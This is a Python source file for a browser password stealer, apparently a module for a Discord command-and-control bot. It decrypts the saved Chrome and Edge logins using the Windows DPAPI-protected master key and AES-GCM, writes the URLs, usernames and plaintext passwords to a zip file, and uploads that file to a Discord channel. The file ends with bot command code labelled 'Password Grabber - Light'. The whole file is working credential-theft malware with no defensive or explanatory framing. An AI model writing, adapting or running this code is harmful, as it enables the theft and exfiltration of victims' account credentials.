import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
import time
from datetime import datetime, timedelta
import zipfile
import discord

async def upload_to_discord(data, ctx):
    try:
        # Save passwords to file
        temp_dir = os.environ['TEMP']
        passwords_file = os.path.join(temp_dir, 'passwords.txt')
        zip_file = os.path.join(temp_dir, 'passwords.zip')
        
        with open(passwords_file, 'w', encoding='utf-8') as f:
            if data:
                for url, credentials in data.items():
                    username, password = credentials
                    f.write(f"URL: {url}\n")
                    f.write(f"Username: {username}\n")
                    f.write(f"Password: {password}\n")
                    f.write("-" * 50 + "\n")
            else:
                f.write("No passwords found\n")
        
        # Create zip file
        with zipfile.ZipFile(zip_file, 'w') as zipf:
            zipf.write(passwords_file, 'passwords.txt')
        
        # Send the zip file
        with open(zip_file, 'rb') as f:
            await ctx.send(file=discord.File(f, "passwords.zip"))
        
        # Clean up
        if os.path.exists(passwords_file):
            os.remove(passwords_file)
        if os.path.exists(zip_file):
            os.remove(zip_file)
            
    except Exception as e:
        await ctx.send(f"Upload error: {str(e)}")

def get_master_key():
    try:
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Local State', "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
    except: 
        return None
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]

def decrypt_password_edge(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception as e: 
        return "Chrome < 80"

def get_passwords_edge():
    master_key = get_master_key()
    if not master_key:
        return {}
        
    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Default\Login Data'
    if not os.path.exists(login_db):
        return {}
        
    try: 
        shutil.copy2(login_db, "Loginvault.db")
    except: 
        return {}
        
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()

    result = {}
    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password_edge(encrypted_password, master_key)
            if username != "" or decrypted_password != "":
                result[url] = [username, decrypted_password]
    except: 
        pass

    cursor.close()
    conn.close()
    try: 
        os.remove("Loginvault.db")
    except Exception as e: 
        pass
        
    return result

def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    try:
        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)

        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except: 
        return None

def decrypt_password_chrome(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try: 
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except: 
            return ""

def get_chrome_passwords():
    key = get_encryption_key()
    if not key:
        return {}
        
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
    if not os.path.exists(db_path):
        return {}
        
    file_name = "ChromeData.db"
    shutil.copyfile(db_path, file_name)
    db = sqlite3.connect(file_name)
    cursor = db.cursor()
    
    result = {}
    try:
        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        for row in cursor.fetchall():
            action_url = row[1]
            username = row[2]
            password = decrypt_password_chrome(row[3], key)
            if username or password:
                result[action_url] = [username, password]
    except: 
        pass
        
    cursor.close()
    db.close()
    try: 
        os.remove(file_name)
    except: 
        pass
        
    return result

def grab_passwords():
    result = {}
    
    # Get Chrome passwords
    try: 
        chrome_passwords = get_chrome_passwords()
        result.update(chrome_passwords)
    except: 
        pass

    # Get Edge passwords  
    try: 
        edge_passwords = get_passwords_edge()
        result.update(edge_passwords)
    except: 
        pass
    
    return result

# This is the actual command implementation that will be inserted into the bot
pass_light_command_code = '''
    """Light password grabber for Chrome and Edge"""
    try:
        await ctx.send("🔍 Starting password collection...")
        
        passwords_data = grab_passwords()
        
        if passwords_data:
            await upload_to_discord(passwords_data, ctx)
            
            # Send completion message
            embed = discord.Embed(
                title="🔑 Password Grabber - Light",
                description=f"Successfully collected {len(passwords_data)} sets of credentials",
                colour=discord.Colour.green()
            )
            await ctx.send(embed=embed)
        else:
            embed = discord.Embed(
                title="🔑 Password Grabber - Light",
                description="No passwords found in Chrome or Edge browsers",
                colour=discord.Colour.orange()
            )
            await ctx.send(embed=embed)
            
    except Exception as e:
        embed = discord.Embed(
            title="❌ Password Grabber - Light",
            description=f"Error: {str(e)}",
            colour=discord.Colour.red()
        )
        await ctx.send(embed=embed)
'''